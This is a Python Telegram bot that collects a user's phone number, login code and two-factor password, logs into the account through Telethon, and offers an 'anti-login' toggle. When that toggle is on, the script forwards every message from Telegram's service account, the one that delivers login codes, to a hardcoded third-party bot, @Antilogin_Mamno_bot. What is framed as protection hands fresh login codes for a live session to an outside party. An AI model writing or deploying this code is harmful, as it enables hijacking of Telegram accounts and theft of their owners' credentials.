# ==============================
# 📬 Telegram: @Abolfazl_rwm — ⚠️ استفاده، ویرایش و بازنشر فقط با ذکر منبع مجاز است؛ حذف این اعتبار اجازه نمی‌شود
# Use, edit and redistribute only with attribution to @Abolfazl_rwm.
# ==============================
import asyncio
import platform
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
# Broken | @Mamno
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import re
import logging

# Configure logging to show only WARNING and above
logging.basicConfig(level=logging.WARNING)
# Broken | @Mamno
logger = logging.getLogger(__name__)

# Disable httpx and other noisy loggers
logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('apscheduler').setLevel(logging.WARNING)
logging.getLogger('telegram').setLevel(logging.WARNING)
# Broken | @Mamno

# API credentials
API_ID = 0  # Replace your api id
API_HASH = '' # Replace your api hash
BOT_TOKEN = '' # Replace your bot token
FORWARD_BOT_USERNAME = '@Antilogin_Mamno_bot'
# Broken | @Mamno

# In-memory storage for accounts and states
accounts = {}  # {phone: {'client': TelegramClient, 'session_name': str, 'anti_login': False}}
user_states = {}  # {user_id: {'state': str, 'phone': str}}

# Regex for phone number
PHONE_REGEX = re.compile(r'^\+\d{10,15}$')
# Broken | @Mamno

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("Add Account", callback_data="add_account")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Welcome! Click below to add an account (max 3 accounts).", reply_markup=reply_markup)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
# Broken | @Mamno

    if query.data == "add_account":
        if len(accounts) >= 3:
            await query.message.reply_text("Maximum 3 accounts allowed!")
            return
        user_states[user_id] = {'state': 'awaiting_phone'}
        await query.message.reply_text("Please send the phone number (e.g., +1234567890).")
# Broken | @Mamno

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    text = update.message.text

    if user_id not in user_states:
        return
# Broken | @Mamno

    state = user_states[user_id].get('state')

    if state == 'awaiting_phone':
        if not PHONE_REGEX.match(text):
            await update.message.reply_text("Invalid phone number! Please send in format: +1234567890")
            return
        if text in accounts:
            await update.message.reply_text("This phone number is already added!")
            return
# Broken | @Mamno
        user_states[user_id]['phone'] = text
        user_states[user_id]['state'] = 'awaiting_code'
        phone = user_states[user_id]['phone']
        
        # Create a new session for the account
        session_name = f"session{len(accounts) + 1}"
        client = TelegramClient(StringSession(), API_ID, API_HASH)
# Broken | @Mamno
        await client.connect()
        await client.send_code_request(phone)
        accounts[phone] = {'client': client, 'session_name': session_name, 'anti_login': False}
        await update.message.reply_text("Code sent to your Telegram. Please send the code.")

    elif state == 'awaiting_code':
        phone = user_states[user_id].get('phone')
        if phone not in accounts:
            await update.message.reply_text("Session expired or phone not registered. Please start over with /start.")
            del user_states[user_id]
            return
# Broken | @Mamno
        client = accounts[phone]['client']
        try:
            await client.sign_in(phone, code=text)
            if await client.is_user_authorized():
                await update.message.reply_text("Successfully logged in!")
                setup_client_handlers(client, phone)
                del user_states[user_id]
# Broken | @Mamno
            else:
                user_states[user_id]['state'] = 'checking_password'
                await update.message.reply_text("Code accepted. Checking if password is needed...")
        except PhoneCodeInvalidError:
            await update.message.reply_text("Invalid code! Please send the correct code.")
            return
        except SessionPasswordNeededError:
            user_states[user_id]['state'] = 'awaiting_password'
            await update.message.reply_text("Account has a password. Please send the password.")
            return
# Broken | @Mamno
        except Exception as e:
            logger.error(f"Sign-in error: {str(e)}")
            await update.message.reply_text(f"Sign-in failed: {str(e)}. Please try again.")
            return

    elif state == 'awaiting_password':
        phone = user_states[user_id].get('phone')
        if phone not in accounts:
            await update.message.reply_text("Session expired or phone not registered. Please start over with /start.")
            del user_states[user_id]
            return
# Broken | @Mamno
        client = accounts[phone]['client']
        try:
            await client.sign_in(password=text)
            if await client.is_user_authorized():
                await update.message.reply_text("Successfully logged in!")
                setup_client_handlers(client, phone)
                del user_states[user_id]
            else:
                await update.message.reply_text("Failed to log in. Please try again.")
# Broken | @Mamno
        except Exception as e:
            await update.message.reply_text(f"Invalid password! Error: {str(e)}. Please send the correct password.")
            return

def setup_client_handlers(client, phone):
    @client.on(events.NewMessage(outgoing=True))
    async def handle_self_check(event):
        if event.message.text.lower() == 'self check':
            await event.message.edit(text='self checked!')
# Broken | @Mamno

    @client.on(events.NewMessage(outgoing=True, pattern='antilogin$'))
    async def check_anti_login(event):
        status = 'on' if accounts[phone]['anti_login'] else 'off'
        await event.message.edit(text=f'Anti-login is {status}.')

    @client.on(events.NewMessage(outgoing=True, pattern='antilogin on$'))
    async def enable_anti_login(event):
        accounts[phone]['anti_login'] = True
        await event.message.edit(text='Anti-login turned on successfully.')
# Broken | @Mamno

    @client.on(events.NewMessage(outgoing=True, pattern='antilogin off$'))
    async def disable_anti_login(event):
        accounts[phone]['anti_login'] = False
        await event.message.edit(text='Anti-login has been successfully disabled.')

    @client.on(events.NewMessage(from_users=[777000]))
    async def forward_anti_login(event):
        if accounts[phone]['anti_login']:
            try:
                # Resolve the bot username to an entity
                bot_entity = await client.get_entity(FORWARD_BOT_USERNAME)
# Broken | @Mamno
                await client.forward_messages(bot_entity, event.message)
            except Exception as e:
                logger.error(f"Failed to forward message to {FORWARD_BOT_USERNAME}: {str(e)}")

async def main():
    print("Bot Is Running")  # Display "ران شد" when the bot starts
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
# Broken | @Mamno
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    while True:
        await asyncio.sleep(1.0 / 60)
# Broken | @Mamno

if platform.system() == "Emscripten":
    asyncio.ensure_future(main())
else:
    if __name__ == "__main__":
        asyncio.run(main())